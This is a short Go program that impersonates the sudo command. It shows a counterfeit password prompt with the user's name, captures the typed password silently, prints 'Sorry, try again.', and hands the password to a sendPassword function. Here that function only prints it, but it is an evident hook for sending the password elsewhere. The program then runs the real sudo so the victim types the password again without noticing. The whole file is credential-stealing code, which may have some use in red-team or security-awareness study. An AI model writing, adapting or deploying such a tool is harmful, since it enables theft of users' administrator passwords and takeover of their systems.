package main

import (
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"syscall"
	"time"

	"golang.org/x/crypto/ssh/terminal"
)

func getCommandPath(command string) string {
	fullPath, err1 := exec.LookPath(command)
	if err1 != nil {
		fmt.Printf("sudo: %s: command not found\n", command)
		os.Exit(1)
	}
	return fullPath
}

func sendPassword(password string) {
	fmt.Println("\nPassword typed: " + password)
}

func fakeSudoPassPrompt() {
	currentUser, err := user.Current()
	fmt.Printf("[sudo] password for %s: ", currentUser.Username)
	bytePassword, err := terminal.ReadPassword(int(syscall.Stdin))
	fmt.Print("\n")
	time.Sleep(2 * time.Second)
	fmt.Println("Sorry, try again.")
	if err == nil {
		sendPassword(string(bytePassword))
	}
}

func main() {
	cmdArgs := os.Args[1:]

	var commandString string
	if len(cmdArgs) == 0 {
		commandString = "sudo || true"
	} else {
		postFix := strings.Join(os.Args[1:], " ")
		commandString = fmt.Sprintf("sudo -- %s", postFix)

		fakeSudoPassPrompt()
	}

	bashPath := getCommandPath("bash")
	args := []string{"bash", "-c", commandString}
	env := os.Environ()

	err := syscall.Exec(bashPath, args, env)
	if err != nil && false {
		panic(err)
	}
}
